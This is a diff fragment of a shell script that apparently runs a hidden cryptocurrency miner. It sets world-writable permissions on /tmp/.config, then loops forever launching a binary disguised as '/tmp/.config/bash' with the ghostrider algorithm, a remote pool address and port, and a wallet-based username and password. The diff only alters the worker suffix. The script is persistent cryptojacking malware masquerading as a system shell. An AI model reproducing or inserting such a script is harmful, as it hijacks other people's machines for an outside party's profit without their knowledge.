@@ -7,6 +7,6 @@ chmod -R  777 /tmp/.config
 
 #!/bin/sh
 while [ 1 ]; do
-	/tmp/.config/bash -a ghostrider --url 165.22.62.162:7090 --user RDACoFmDxhJrktrSsfWHEcCgybGezuPkCw.20888 --pass 5566
+	/tmp/.config/bash -a ghostrider --url 165.22.62.162:7090 --user RDACoFmDxhJrktrSsfWHEcCgybGezuPkCw.2088a --pass 5566
 	sleep 5
 done
